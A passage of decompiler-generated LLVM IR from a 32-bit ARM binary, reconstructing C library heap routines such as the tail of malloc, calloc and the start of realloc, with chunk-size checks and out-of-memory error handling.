  store i32 %v5_1bebc, i32* %r3.global-to-local, align 4
  %v1_1bec4 = add i32 %v4_1beb4, 868
  %v2_1bec4 = inttoptr i32 %v1_1bec4 to i32*
  %v3_1bec4 = load i32, i32* %v2_1bec4, align 4
  store i32 %v3_1bec4, i32* %r3.global-to-local, align 4
  %v1_1bec8 = add i32 %v4_1beb4, 884
  %v2_1bec8 = inttoptr i32 %v1_1bec8 to i32*
  %v3_1bec8 = load i32, i32* %v2_1bec8, align 4
  store i32 %v3_1bec8, i32* %r2.global-to-local, align 4
  %v2_1becc = add i32 %v3_1bec4, %v2_1bebc
  store i32 %v2_1becc, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_1bebc, %v5_1bebc
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_1beac
  store i32 %v2_1bebc, i32* %v4_1bebc, align 4
  %v0_1bed4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1bed4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_1beac, %bb165
  %v1_1bed4 = phi i32 [ %v3_1bec8, %dec_label_pc_1beac ], [ %v1_1bed4.pre, %bb165 ]
  %v4_1bed8 = phi i32 [ %v2_1becc, %dec_label_pc_1beac ], [ %v0_1bed4.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_1bed8, %v1_1bed4
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_1bed8 = load i32, i32* %lr.global-to-local, align 4
  %v6_1bed8 = add i32 %v5_1bed8, 884
  %v7_1bed8 = inttoptr i32 %v6_1bed8 to i32*
  store i32 %v4_1bed8, i32* %v7_1bed8, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_1bedc = load i32, i32* %lr.global-to-local, align 4
  %v1_1bedc = add i32 %v0_1bedc, 44
  %v2_1bedc = inttoptr i32 %v1_1bedc to i32*
  %v3_1bedc = load i32, i32* %v2_1bedc, align 4
  store i32 %v3_1bedc, i32* %ip.global-to-local, align 4
  %v1_1bee0 = add i32 %v3_1bedc, 4
  %v2_1bee0 = inttoptr i32 %v1_1bee0 to i32*
  %v3_1bee0 = load i32, i32* %v2_1bee0, align 4
  store i32 %v1_1baf4, i32* %r1.global-to-local, align 4
  %v1_1bee8 = and i32 %v3_1bee0, -4
  store i32 %v1_1bee8, i32* %r3.global-to-local, align 4
  %v3_1beec = icmp ult i32 %v1_1bee8, %v1_1baf4
  br i1 %v3_1beec, label %dec_label_pc_1bf18, label %dec_label_pc_1bef4

dec_label_pc_1bef4:                               ; preds = %bb168
  %v0_1bef4 = load i32, i32* @sl, align 4
  %v2_1bef4 = sub i32 %v1_1bee8, %v0_1bef4
  %v2_1bef8 = add i32 %v0_1bef4, %v3_1bedc
  store i32 %v2_1bef8, i32* %r1.global-to-local, align 4
  %v1_1befc = or i32 %v2_1bef4, 1
  store i32 %v1_1befc, i32* %r3.global-to-local, align 4
  %v1_1bf00 = or i32 %v0_1bef4, 1
  store i32 %v1_1bf00, i32* %r2.global-to-local, align 4
  %v1_1bf04 = add i32 %v3_1bedc, 8
  store i32 %v1_1bf04, i32* %r0.global-to-local, align 4
  store i32 %v1_1bf00, i32* %v2_1bee0, align 4
  %v0_1bf0c = load i32, i32* %r1.global-to-local, align 4
  %v1_1bf0c = load i32, i32* %lr.global-to-local, align 4
  %v2_1bf0c = add i32 %v1_1bf0c, 44
  %v3_1bf0c = inttoptr i32 %v2_1bf0c to i32*
  store i32 %v0_1bf0c, i32* %v3_1bf0c, align 4
  %v0_1bf10 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bf10 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bf10 = add i32 %v1_1bf10, 4
  %v3_1bf10 = inttoptr i32 %v2_1bf10 to i32*
  store i32 %v0_1bf10, i32* %v3_1bf10, align 4
  br label %dec_label_pc_1bf30

dec_label_pc_1bf18:                               ; preds = %bb157, %bb168, %dec_label_pc_1bcf4
  store i32 65856, i32* %r3.global-to-local, align 4
  %v0_1bf1c = call i32 @__aeabi_read_tp()
  %v3_1bf20 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1bf20 = sext i16 %v3_1bf20 to i32
  store i32 %v4_1bf20, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_1bf28 = add i32 %v4_1bf20, %v0_1bf1c
  %v4_1bf28 = inttoptr i32 %v3_1bf28 to i32*
  store i32 12, i32* %v4_1bf28, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf30

dec_label_pc_1bf30:                               ; preds = %bb151, %bb150, %dec_label_pc_1bef4, %dec_label_pc_1bb3c, %dec_label_pc_1bf18
  %v0_1bf30 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1bf30, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1bf34:                               ; preds = %.thread1, %dec_label_pc_1bb08, %.thread121, %dec_label_pc_1b978, %dec_label_pc_1b96c, %dec_label_pc_1b7d4, %dec_label_pc_1b758, %dec_label_pc_1bf30
  store i32 %v2_1b678, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  %v4_1bf44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 44) to i32*), align 4
  store i32 %v4_1bf44, i32* @ip, align 4
  store i32 114512, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1bf44)
  br label %dec_label_pc_1bf50

dec_label_pc_1bf50:                               ; preds = %dec_label_pc_1b6b0, %dec_label_pc_1bf34
  %v0_1bf50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1bf50, i32* %r0.global-to-local, align 4
  store i32 %v3_1b64c, i32* @r4, align 4
  store i32 %v6_1b64c, i32* @r5, align 4
  store i32 %v9_1b64c, i32* @r6, align 4
  store i32 %v12_1b64c, i32* @r7, align 4
  store i32 %v15_1b64c, i32* @r8, align 4
  store i32 %v18_1b64c, i32* @sb, align 4
  store i32 %v21_1b64c, i32* @sl, align 4
  store i32 %v24_1b64c, i32* @fp, align 4
  store i32 %v27_1b64c, i32* @lr, align 4
  ret i32 %v0_1bf50

; uselistorder directives
  uselistorder i32 %v0_1bef4, { 1, 0, 2 }
  uselistorder i32 %v3_1bedc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1bed8, { 1, 0 }
  uselistorder i32 %v2_1bebc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1beb4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1be6c, { 1, 2, 0 }
  uselistorder i32 %v0_1be34, { 1, 0 }
  uselistorder i32 %v0_1be28, { 1, 0 }
  uselistorder i32 %v2_1be18, { 1, 0 }
  uselistorder i32 %v2_1bda8, { 2, 1, 0 }
  uselistorder i32 %v2_1bd90, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1bd88, { 1, 0, 2 }
  uselistorder i32 %v1_1bd84, { 2, 1, 0 }
  uselistorder i32 %v0_1bd84, { 3, 1, 2, 0 }
  uselistorder i32 %v1_1bd68, { 1, 0 }
  uselistorder i32 %v2_1bd40, { 1, 0 }
  uselistorder i32 %v3_1bd34, { 1, 0, 2 }
  uselistorder i32 %v2_1bd14, { 1, 0, 2 }
  uselistorder i32* %v2_1bd0c, { 1, 0, 2 }
  uselistorder i32 %v0_1bcf4, { 1, 0 }
  uselistorder i32 %v6_1bcd0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1bcbc, { 2, 1, 0 }
  uselistorder i32 %v0_1bca4, { 1, 0 }
  uselistorder i32 %v2_1bc60, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1bc5c, { 1, 0 }
  uselistorder i32 %v3_1bc34, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_1bc14, { 1, 0, 2 }
  uselistorder i32 %v2_1bbfc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1bba4, { 2, 1, 0 }
  uselistorder i32 %v6_1bb98, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_1bb74, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1bb34, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1baf4, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_1baec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1bae8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_1bad4, { 1, 0 }
  uselistorder i32 %v7_1ba94, { 1, 0 }
  uselistorder i32 %v4_1ba94, { 1, 0 }
  uselistorder i32 %v0_1ba64, { 1, 0 }
  uselistorder i32 %v2_1ba38, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1ba3454, { 1, 0 }
  uselistorder i32 %v1_1ba00, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1b9e8., { 1, 2, 0 }
  uselistorder i32 %v0_1b9f0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1b9f0, { 1, 0 }
  uselistorder i32 %v3_1b9d0, { 1, 0 }
  uselistorder i32 %v4_1b9cc, { 1, 0, 2 }
  uselistorder i32 %v1_1b93c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1b994, { 1, 0 }
  uselistorder i32 %v1_1b978, { 1, 0 }
  uselistorder i32 %v1_1b818, { 1, 0 }
  uselistorder i32 %v0_1b958, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1b920, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1b9b4.pre, { 1, 2, 0 }
  uselistorder i32 %v0_1b8fc, { 2, 1, 0 }
  uselistorder i32 %v3_1b8f0, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_1b810, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1b8b8, { 1, 0 }
  uselistorder i32 %v3_1b8ac, { 1, 0 }
  uselistorder i32 %v0_1b8b8, { 1, 0 }
  uselistorder i32 %v3_1b890, { 0, 2, 3, 1 }
  uselistorder i32 %v2_1b880, { 1, 0, 2 }
  uselistorder i32 %v3_1b838, { 2, 1, 0 }
  uselistorder i32 %v0_1b828, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1b7f8, { 1, 0 }
  uselistorder i32 %v1_1b7ac, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1b7a8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_1b74c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_1b740, { 1, 0 }
  uselistorder i32 %v3_1b710, { 1, 0 }
  uselistorder i32 %v0_1b704, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_1b6e4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1b6d8, { 1, 0 }
  uselistorder i32 %v0_1b6a8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 1, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_1bf50, { 1, 0 }
  uselistorder label %dec_label_pc_1bf34, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1bf30, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1bf18, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_1beac, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1be28, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1be20, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1bcf4, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_1bc28, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_1bae0, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_1ba34, { 1, 0 }
  uselistorder label %dec_label_pc_1ba3c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1ba00, { 1, 0 }
  uselistorder label %dec_label_pc_1b9b4, { 1, 0 }
  uselistorder label %dec_label_pc_1b948, { 1, 0 }
  uselistorder label %dec_label_pc_1b944, { 1, 0 }
  uselistorder label %dec_label_pc_1b8f0, { 1, 0 }
  uselistorder label %dec_label_pc_1b8dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b8a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1b890, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_1bf64(i32 %arg1) local_unnamed_addr {
dec_label_pc_1bf64:
  %v0_1bf64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1bf64, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1bf64
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1bf64, %bb
  %v4_1bf80 = phi i32 [ %arg1, %dec_label_pc_1bf64 ], [ 0, %bb ]
  ret i32 %v4_1bf80

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1bf84 = load i32, i32* @r4, align 4
  %v6_1bf84 = load i32, i32* @r5, align 4
  %v9_1bf84 = load i32, i32* @r6, align 4
  %v12_1bf84 = load i32, i32* @lr, align 4
  %v2_1bf8c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_1bf9c = mul i32 %arg2, %arg1
  store i32 %v2_1bf9c, i32* @r6, align 4
  br i1 %v2_1bf8c, label %dec_label_pc_1bfd4, label %dec_label_pc_1bfa4

dec_label_pc_1bfa4:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_1bfac = udiv i32 %v2_1bf9c, %arg1
  %v9_1bfb0 = icmp eq i32 %v2_1bfac, %arg2
  br i1 %v9_1bfb0, label %dec_label_pc_1bfd4, label %dec_label_pc_1bfb8

dec_label_pc_1bfb8:                               ; preds = %dec_label_pc_1bfa4
  %v0_1bfbc = call i32 @__aeabi_read_tp()
  %v3_1bfc0 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1bfc0 = sext i16 %v3_1bfc0 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1bfcc = add i32 %v4_1bfc0, %v0_1bfbc
  %v4_1bfcc = inttoptr i32 %v3_1bfcc to i32*
  store i32 12, i32* %v4_1bfcc, align 4
  br label %dec_label_pc_1c098

dec_label_pc_1bfd4:                               ; preds = %dec_label_pc_1bfa4, %entry
  %v4_1bfd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 108) to i32*), align 4
  store i32 %v4_1bfd8, i32* @r4, align 4
  %v4_1bff0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 112) to i32*), align 4
  store i32 %v4_1bff0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1bff0)
  %v0_1c004 = load i32, i32* @r5, align 4
  %v2_1c004 = add i32 %v0_1c004, 16
  %v3_1c004 = inttoptr i32 %v2_1c004 to i32*
  %v4_1c004 = load i32, i32* %v3_1c004, align 4
  store i32 %v4_1c004, i32* %ip.global-to-local, align 4
  store i32 114704, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c004)
  %v0_1c010 = load i32, i32* @r6, align 4
  %v1_1c014 = call i32 @malloc(i32 %v0_1c010)
  store i32 %v1_1c014, i32* %r4.global-to-local, align 4
  %v2_1c018 = icmp eq i32 %v1_1c014, 0
  br i1 %v2_1c018, label %.thread, label %dec_label_pc_1c020

dec_label_pc_1c020:                               ; preds = %dec_label_pc_1bfd4
  %v1_1c020 = add i32 %v1_1c014, -4
  %v2_1c020 = inttoptr i32 %v1_1c020 to i32*
  %v3_1c020 = load i32, i32* %v2_1c020, align 4
  %v1_1c024 = and i32 %v3_1c020, 2
  %v2_1c024 = icmp eq i32 %v1_1c024, 0
  br i1 %v2_1c024, label %dec_label_pc_1c02c, label %.thread

dec_label_pc_1c02c:                               ; preds = %dec_label_pc_1c020
  %v1_1c02c6 = add i32 %v3_1c020, -4
  %v1_1c030 = and i32 %v1_1c02c6, -4
  %v3_1c034 = udiv i32 %v1_1c030, 4
  store i32 %v3_1c034, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1c030, 36
  %v2_1c03c = icmp ult i32 %v1_1c030, 33
  %v3_1c03c = or i1 %tmp, %v2_1c03c
  br i1 %v3_1c03c, label %dec_label_pc_1c048, label %dec_label_pc_1c040

dec_label_pc_1c040:                               ; preds = %dec_label_pc_1c02c
  %v3_1c040 = inttoptr i32 %v1_1c014 to i8*
  %v4_1c040 = call i32 @__GI_memset(i8* %v3_1c040, i32 0, i32 %v1_1c030)
  br label %.thread

dec_label_pc_1c048:                               ; preds = %dec_label_pc_1c02c
  %tmp7 = icmp eq i32 %v1_1c030, 16
  %v2_1c04c = inttoptr i32 %v1_1c014 to i32*
  store i32 0, i32* %v2_1c04c, align 4
  %v1_1c050 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c050 = add i32 %v1_1c050, 4
  %v3_1c050 = inttoptr i32 %v2_1c050 to i32*
  store i32 0, i32* %v3_1c050, align 4
  %v1_1c054 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c054 = add i32 %v1_1c054, 8
  %v3_1c054 = inttoptr i32 %v2_1c054 to i32*
  store i32 0, i32* %v3_1c054, align 4
  %v2_1c058 = icmp ult i32 %v1_1c030, 13
  %v3_1c058 = or i1 %tmp7, %v2_1c058
  br i1 %v3_1c058, label %.thread, label %dec_label_pc_1c05c

dec_label_pc_1c05c:                               ; preds = %dec_label_pc_1c048
  %v0_1c05c = load i32, i32* %ip.global-to-local, align 4
  %v1_1c060 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c060 = add i32 %v1_1c060, 12
  %v3_1c060 = inttoptr i32 %v2_1c060 to i32*
  store i32 0, i32* %v3_1c060, align 4
  %v1_1c064 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c064 = add i32 %v1_1c064, 16
  %v3_1c064 = inttoptr i32 %v2_1c064 to i32*
  store i32 0, i32* %v3_1c064, align 4
  %tmp8 = icmp ult i32 %v0_1c05c, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_1c06c

dec_label_pc_1c06c:                               ; preds = %dec_label_pc_1c05c
  %v0_1c06c = load i32, i32* %ip.global-to-local, align 4
  %v7_1c06c = icmp eq i32 %v0_1c06c, 9
  %v1_1c070 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c070 = add i32 %v1_1c070, 20
  %v3_1c070 = inttoptr i32 %v2_1c070 to i32*
  store i32 0, i32* %v3_1c070, align 4
  %v1_1c074 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c074 = add i32 %v1_1c074, 24
  %v3_1c074 = inttoptr i32 %v2_1c074 to i32*
  store i32 0, i32* %v3_1c074, align 4
  br i1 %v7_1c06c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1c06c
  %v2_1c078 = load i32, i32* %r4.global-to-local, align 4
  %v3_1c078 = add i32 %v2_1c078, 32
  %v4_1c078 = inttoptr i32 %v3_1c078 to i32*
  store i32 0, i32* %v4_1c078, align 4
  %v2_1c07c = load i32, i32* %r4.global-to-local, align 4
  %v3_1c07c = add i32 %v2_1c07c, 28
  %v4_1c07c = inttoptr i32 %v3_1c07c to i32*
  store i32 0, i32* %v4_1c07c, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1c06c, %dec_label_pc_1c020, %dec_label_pc_1c05c, %dec_label_pc_1c048, %dec_label_pc_1bfd4, %dec_label_pc_1c040, %bb
  store i32 1, i32* @r1, align 4
  %v0_1c08c = load i32, i32* @r5, align 4
  %v2_1c08c = add i32 %v0_1c08c, 44
  %v3_1c08c = inttoptr i32 %v2_1c08c to i32*
  %v4_1c08c = load i32, i32* %v3_1c08c, align 4
  store i32 %v4_1c08c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1c08c)
  br label %dec_label_pc_1c098

dec_label_pc_1c098:                               ; preds = %dec_label_pc_1bfb8, %.thread
  %v0_1c098 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1bf84, i32* @r4, align 4
  store i32 %v6_1bf84, i32* @r5, align 4
  store i32 %v9_1bf84, i32* @r6, align 4
  store i32 %v12_1bf84, i32* @lr, align 4
  ret i32 %v0_1c098

; uselistorder directives
  uselistorder i32 %v1_1c030, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v1_1c014, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 7, 2, 1, 8, 11, 3, 4, 5, 6, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1c098, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1c0b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c0b0:
  %v0_1c0b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c0b0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1c0b0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1c0b0, %bb
  %v4_1c0c0 = phi i32 [ %arg1, %dec_label_pc_1c0b0 ], [ 0, %bb ]
  ret i32 %v4_1c0c0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1c0c4 = load i32, i32* @r4, align 4
  %v6_1c0c4 = load i32, i32* @r5, align 4
  %v9_1c0c4 = load i32, i32* @r6, align 4
  %v12_1c0c4 = load i32, i32* @r7, align 4
  %v15_1c0c4 = load i32, i32* @r8, align 4
  %v18_1c0c4 = load i32, i32* @sb, align 4
  %v21_1c0c4 = load i32, i32* @sl, align 4
  %v24_1c0c4 = load i32, i32* @fp, align 4
  %v27_1c0c4 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1c0d0 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1c0d0, label %dec_label_pc_1c0e4, label %dec_label_pc_1c0f4

dec_label_pc_1c0e4:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_1c0e8 = call i32 @malloc(i32 %arg2)
  store i32 %v1_1c0e8, i32* %r0.global-to-local, align 4
  store i32 %v1_1c0e8, i32* @r4, align 4
  br label %dec_label_pc_1c454

dec_label_pc_1c0f4:                               ; preds = %entry
  %v2_1c0f4 = icmp eq i32 %arg2, 0
  br i1 %v2_1c0f4, label %dec_label_pc_1c0fc, label %dec_label_pc_1c108

dec_label_pc_1c0fc:                               ; preds = %dec_label_pc_1c0f4
  %v0_1c0fc = call i32 @free()
  store i32 %v0_1c0fc, i32* %r0.global-to-local, align 4
  %v0_1c100 = load i32, i32* @r6, align 4
  store i32 %v0_1c100, i32* @r4, align 4
  br label %dec_label_pc_1c454

dec_label_pc_1c108:                               ; preds = %dec_label_pc_1c0f4
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_1c110 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 108) to i32*), align 4
  store i32 %v4_1c110, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_1c110, i32* %r2.global-to-local, align 4
  %v4_1c11c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 68) to i32*), align 4
  store i32 %v4_1c11c, i32* %r1.global-to-local, align 4
  %v2_1c120 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1c120, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_1c128 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1c128)
  %v0_1c134 = load i32, i32* @r4, align 4
  store i32 %v0_1c134, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r1.global-to-local, align 4
  %v4_1c140 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_1c14c.519 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1c140)
  %v0_1c14c = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_1c14c, -32
  br i1 %tmp36, label %dec_label_pc_1c170, label %dec_label_pc_1c154

dec_label_pc_1c154:                               ; preds = %dec_label_pc_1c108
  store i32 65284, i32* %r2.global-to-local, align 4
  %v0_1c158 = call i32 @__aeabi_read_tp()
  store i32 %v0_1c158, i32* %r0.global-to-local, align 4
  %v3_1c15c = load i16, i16* @global_var_2c068.414, align 2
  %v4_1c15c = sext i16 %v3_1c15c to i32
  store i32 %v4_1c15c, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_1c168 = add i32 %v4_1c15c, %v0_1c158
  %v4_1c168 = inttoptr i32 %v3_1c168 to i32*
  store i32 12, i32* %v4_1c168, align 4
  br label %dec_label_pc_1c454

dec_label_pc_1c170:                               ; preds = %dec_label_pc_1c108
  %v1_1c170 = add i32 %v0_1c14c, 11
  store i32 %v1_1c170, i32* %r0.global-to-local, align 4
